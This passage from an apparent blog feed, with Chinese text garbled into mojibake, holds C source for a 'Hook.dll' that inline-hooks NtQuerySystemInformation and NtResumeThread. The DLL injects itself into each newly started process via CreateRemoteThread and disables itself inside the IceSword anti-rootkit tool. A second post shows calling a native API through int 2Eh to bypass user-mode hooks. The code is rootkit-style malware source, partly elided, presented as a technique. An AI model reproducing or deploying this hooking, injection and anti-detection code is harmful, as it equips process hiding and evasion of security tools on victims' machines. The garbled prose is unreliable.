class="hljs-number">0</span>);<br><br>    CloseHandle (hProcessSnap);<br>    <span class="hljs-keyword">return</span> ;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>Hook.dll: å…³é”®ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>BOOL g_bHook = FALSE;<br><br><span class="hljs-keyword">typedef</span> LONG NTSTATUS;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS               ((NTSTATUS)0x00000000L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_ACCESS_DENIED         ((NTSTATUS)0xC0000022L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)</span><br><span class="hljs-keyword">typedef</span> ULONG SYSTEM_INFORMATION_CLASS;<br><span class="hljs-keyword">typedef</span> ULONG THREADINFOCLASS;<br><span class="hljs-keyword">typedef</span> ULONG PROCESSINFOCLASS;<br><span class="hljs-keyword">typedef</span> ULONG KPRIORITY;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMORY_BASIC_INFORMATION_SIZE 28</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">THREAD_BASIC_INFORMATION</span> &#123;</span><br>    NTSTATUS ExitStatus;<br>    PNT_TIB TebBaseAddress;<br>    CLIENT_ID ClientId;<br>    KAFFINITY AffinityMask;<br>    KPRIORITY Priority;<br>    KPRIORITY BasePriority;<br>&#125; THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_BASIC_INFORMATION</span> &#123;</span> <span class="hljs-comment">// Information Class 0</span><br>NTSTATUS ExitStatus;<br>PVOID PebBaseAddress;<br>KAFFINITY AffinityMask;<br>KPRIORITY BasePriority;<br>ULONG UniqueProcessId;<br>ULONG InheritedFromUniqueProcessId;<br>&#125; PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTQUERYSYSTEMINFORMATION)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="hljs-params">  OUT PVOID               SystemInformation,</span><br><span class="hljs-params">  IN ULONG                SystemInformationLength,</span><br><span class="hljs-params">  OUT PULONG              ReturnLength OPTIONAL )</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTRESUMETHREAD)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL</span><br><span class="hljs-params">)</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTQUERYINFORMATIONTHREAD)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN HANDLE ThreadHandle,</span><br><span class="hljs-params">  IN THREADINFOCLASS ThreadInformationClass,</span><br><span class="hljs-params">  OUT PVOID ThreadInformation,</span><br><span class="hljs-params">  IN ULONG ThreadInformationLength,</span><br><span class="hljs-params">  OUT PULONG ReturnLength OPTIONAL)</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall * NTQUERYINFORMATIONPROCESS)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE ProcessHandle,</span><br><span class="hljs-params">IN PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="hljs-params">OUT PVOID ProcessInformation,</span><br><span class="hljs-params">IN ULONG ProcessInformationLength,</span><br><span class="hljs-params">OUT PULONG ReturnLength OPTIONAL)</span>;<br><br><br>NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = <span class="hljs-literal">NULL</span>;<br>NTRESUMETHREAD g_pfNtResumeThread = <span class="hljs-literal">NULL</span>;<br>BYTE g_OldNtQuerySystemInformation[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;, g_NewNtQuerySystemInformation[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>BYTE g_OldNtResumeThread[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;, g_NewNtResumeThread[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>DWORD dwIdOld = <span class="hljs-number">0</span>;<br>CRITICAL_SECTION cs;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">            IN ULONG SystemInformationClass,</span><br><span class="hljs-params">            IN PVOID SystemInformation,</span><br><span class="hljs-params">            IN ULONG SystemInformationLength,</span><br><span class="hljs-params">            OUT PULONG ReturnLength)</span>;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtResumeThread</span><span class="hljs-params">(IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL)</span>;<br><br><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOn</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOff</span><span class="hljs-params">()</span>;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">( HANDLE hModule,</span><br><span class="hljs-params">                       DWORD  ul_reason_for_call,</span><br><span class="hljs-params">                       LPVOID lpReserved )</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        &#123;<br>             InitializeCriticalSection(&amp;cs);<br>             <span class="hljs-type">char</span> Name[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>             GetModuleFileName(<span class="hljs-literal">NULL</span>, Name, MAX_PATH);<br>             <span class="hljs-comment">// æ€æ€å†°åˆƒç©ç©</span><br>             <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(Name, <span class="hljs-string">&quot;IceSword.exe&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>             &#123;<br>                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,<br>                                              <span class="hljs-number">0</span>,<br>                                              GetCurrentProcessId());<br>                TerminateProcess(hProcess, <span class="hljs-number">0</span>);<br>                CloseHandle(hProcess);<br>             &#125;<br>            <span class="hljs-keyword">if</span>(!g_bHook)<br>            &#123;<br>                HookOn();<br>            &#125;<br>            <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>               MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Process Attach&quot;</span>, <span class="hljs-string">&quot;Remote Dll&quot;</span>, MB_OK);<br>            <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">if</span>(g_bHook)<br>        &#123;<br>            HookOff();<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>            MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Off!&quot;</span>, <span class="hljs-string">&quot;Hook Off&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            DeleteCriticalSection(&amp;cs);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">EnableDebugPrivilege</span><span class="hljs-params">(BOOL fEnable)</span> &#123;<br><br>   <span class="hljs-comment">// Enabling the debug privilege allows the application to see</span><br>   <span class="hljs-comment">// information about service applications</span><br>   BOOL fOk = FALSE;    <span class="hljs-comment">// Assume function fails</span><br>   HANDLE hToken;<br><br>   <span class="hljs-comment">// Try to open this process&#x27;s access token</span><br>   <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,<br>      &amp;hToken)) &#123;<br><br>      <span class="hljs-comment">// Attempt to modify the &quot;Debug&quot; privilege</span><br>      TOKEN_PRIVILEGES tp;<br>      tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>      LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>      tp.Privileges[<span class="hljs-number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="hljs-number">0</span>;<br>      AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>      fOk = (GetLastError() == ERROR_SUCCESS);<br>      CloseHandle(hToken);<br>   &#125;<br>   <span class="hljs-keyword">return</span>(fOk);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ThreadBasicInformation 0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(HANDLE hProcess)</span>&#123;<br><br>    <span class="hljs-type">char</span> CurPath[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    GetSystemDirectory(CurPath, <span class="hljs-number">256</span>);<br>    <span class="hljs-built_in">strncat</span>(CurPath, <span class="hljs-string">&quot;\\Hook.dll&quot;</span>, <span class="hljs-number">9</span>);<br>    <span class="hljs-comment">//strcpy(CurPath, &quot;C:\\WINDOWS\\system32\\Hook.dll&quot;);</span><br>    PWSTR pszLibFileRemote = <span class="hljs-literal">NULL</span>;<br><br><br>    <span class="hljs-type">int</span> len = (lstrlen(CurPath)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>    WCHAR wCurPath[<span class="hljs-number">256</span>];<br>    MultiByteToWideChar(CP_ACP,<span class="hljs-number">0</span>,CurPath,<span class="hljs-number">-1</span>,wCurPath,<span class="hljs-number">256</span>);<br><br>    EnableDebugPrivilege(<span class="hljs-number">1</span>);<br><br>    pszLibFileRemote = (PWSTR)<br>        VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pszLibFileRemote,<br>        (PVOID) wCurPath, len, <span class="hljs-literal">NULL</span>);<br><br>    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)<br>         GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    HANDLE hRemoteThread = CreateRemoteThread(hProcess,<br>                                                      <span class="hljs-literal">NULL</span>,<br>                                                      <span class="hljs-number">0</span>,<br>                                                      pfnThreadRtn,<br>                                                      pszLibFileRemote,<br>                                                      <span class="hljs-number">0</span>,<br>                                                      <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hRemoteThread, INFINITE);<br>    CloseHandle(hRemoteThread);<br><br>    EnableDebugPrivilege(<span class="hljs-number">0</span>);<br><br>&#125;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtResumeThread</span><span class="hljs-params">(IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL)</span><br>&#123;<br><br>    NTSTATUS ret;<br>    NTSTATUS nStatus;<br>    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;<br>    NTQUERYINFORMATIONTHREAD NtQueryInformationThread = <span class="hljs-literal">NULL</span>;<br>    THREAD_BASIC_INFORMATION ti;<br>    DWORD Pid = <span class="hljs-number">0</span>;<br><br>    HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,<br>                                                             <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br>    NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll,<br>                                                             <span class="hljs-string">&quot;NtQueryInformationThread&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (NtQueryInformationThread == <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;can&#x27;t get NtQueryInformationThread&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    &#125;<br><br>    nStatus = NtQueryInformationThread(ThreadHandle,<br>                                           ThreadBasicInformation,<br>                                           (PVOID)&amp;ti,<br>                       <span class="hljs-keyword">sizeof</span>(THREAD_BASIC_INFORMATION),<br>                                           <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span>(nStatus != STATUS_SUCCESS)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;fuck failed&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    &#125;<br><br>    Pid = (DWORD)(ti.ClientId.UniqueProcess);<br><br>    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, Pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;open process failed&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>    BYTE FirstByte[<span class="hljs-number">1</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-comment">// check if the process has been hooked</span><br>    ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// å·²ç»è¢«Hookäº†</span><br>    <span class="hljs-keyword">if</span> ( FirstByte[<span class="hljs-number">0</span>] == <span class="hljs-number">0xe9</span>)<br>    &#123;<br><br>       HookOff();<br>       ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);<br>       HookOn();<br><br>       CloseHandle(hProcess);<br><br>       <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">// åˆ›å»ºæ–°è¿›ç¨‹çš„è°ƒç”¨ï¼ŒHook ä¹‹</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        HookOff();<br>        inject(hProcess);<br>        ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);<br>        HookOn();<br><br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">            IN ULONG SystemInformationClass,</span><br><span class="hljs-params">            IN PVOID SystemInformation,</span><br><span class="hljs-params">            IN ULONG SystemInformationLength,</span><br><span class="hljs-params">            OUT PULONG ReturnLength)</span><br>&#123;<br>    NTSTATUS ntStatus;<br><br>    HookOff();<br>    ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass,<br>                                                SystemInformation,<br>                                                SystemInformationLength,<br>                                                ReturnLength);<br>    HookOn();<br><br>   <span class="hljs-keyword">return</span> ntStatus;<br>&#125;<br><br><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOn</span><span class="hljs-params">()</span><br>&#123;<br>    PMEMORY_BASIC_INFORMATION lpAllocBuffer = <span class="hljs-literal">NULL</span>;<br>    DWORD dwOldProtect, dwOldProtect2;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br><br>    <br>    dwIdOld = GetCurrentProcessId();<br>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, dwIdOld);<br>    <span class="hljs-keyword">if</span>(hProcess == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> ;<br><br>     HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>     g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,<br>                                                    <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br><br>     <span class="hljs-keyword">if</span> (g_pfNtQuerySystemInformation == <span class="hljs-literal">NULL</span>)<br>     &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtResumeThread&quot;</span>);<br><br>     <span class="hljs-keyword">if</span> (g_pfNtResumeThread == <span class="hljs-literal">NULL</span>)<br>     &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     EnterCriticalSection(&amp;cs);<br><br>    _asm<br>    &#123;<br>        lea edi,g_OldNtQuerySystemInformation<br>        mov esi,g_pfNtQuerySystemInformation<br>        cld<br>        mov ecx,<span class="hljs-number">5</span><br>        rep movsb<br>        lea edi,g_OldNtResumeThread<br>        mov esi,g_pfNtResumeThread<br>        cld<br>        mov ecx,<span class="hljs-number">5</span><br>        rep movsb<br>    &#125;<br><br>    g_NewNtQuerySystemInformation[<span class="hljs-number">0</span>] = <span class="hljs-number">0xe9</span>;<br>    g_NewNtResumeThread[<span class="hljs-number">0</span>] = <span class="hljs-number">0xe9</span>;<br>    _asm<br>    &#123;<br>        lea eax, NewNtQuerySystemInformation<br>        mov ebx, g_pfNtQuerySystemInformation<br>        sub eax, ebx<br>        sub eax, <span class="hljs-number">5</span><br>        mov dword ptr [g_NewNtQuerySystemInformation + <span class="hljs-number">1</span>], eax<br>        lea eax, NewNtResumeThread<br>        mov ebx, g_pfNtResumeThread<br>        sub eax, ebx<br>        sub eax, <span class="hljs-number">5</span><br>        mov dword ptr [g_NewNtResumeThread + <span class="hljs-number">1</span>], eax<br>    &#125;<br>    .......<br>    LeaveCriticalSection(&amp;cs);<br><br>    g_bHook = TRUE;<br>&#125;<br><br><span class="hljs-comment">// è¿˜åŸè¢«ä¿®æ”¹çš„ä»£ç </span><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOff</span><span class="hljs-params">()</span><br>&#123;<br>    ......<br>    g_bHook = FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-å‚è€ƒèµ„æ–™"><a href="#4-å‚è€ƒèµ„æ–™" class="headerlink" title="4. å‚è€ƒèµ„æ–™"></a>4. å‚è€ƒèµ„æ–™</h2><p>Microsoft MSDNï¼ŒSDK &amp; DDK<br>ã€ŠWindows NT 2000 Native API Referenceã€‹<br>ã€ŠWindows æ ¸å¿ƒç¼–ç¨‹ã€‹<br>ã€ŠæŒ‚é’©Windows APIã€‹<br>ã€Šå¦‚ä½•åœ¨Windows NTä¸­éšè—è‡ªå·±ã€‹</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>int 2eh æ–¹å¼è°ƒç”¨Native api</title>
    <link href="/cn/int23_native_api/"/>
    <url>/cn/int23_native_api/</url>
    
    <content type="html"><![CDATA[<p>å°æŠ€å·§ã€‚ä½†æ˜¯ç”¨çš„äººå¥½åƒä¸å¤šã€‚ä¾‹å­ï¼š  Windows 2000 ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">NtQuerySystemInformationNo = <span class="hljs-number">0x97</span>;<br><br>_declspec(naked)<br>NTSTATUS __stdcall <span class="hljs-title function_">PrivateNtQuerySystemInformation</span><br>    <span class="hljs-params">(IN     SYSTEM_INFORMATION_CLASS,</span><br><span class="hljs-params">    IN OUT PVOID,</span><br><span class="hljs-params">    IN     ULONG,</span><br><span class="hljs-params">    OUT    PULONG OPTIONAL)</span><br>&#123;<br><br>    _asm &#123;<br>        mov eax, NtQuerySystemInformationNo<br>        lea edx, [esp+<span class="hljs-number">4</span>]<br>        <span class="hljs-type">int</span> <span class="hljs-number">2</span>Eh<br>        ret <span class="hljs-number">10</span>h<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
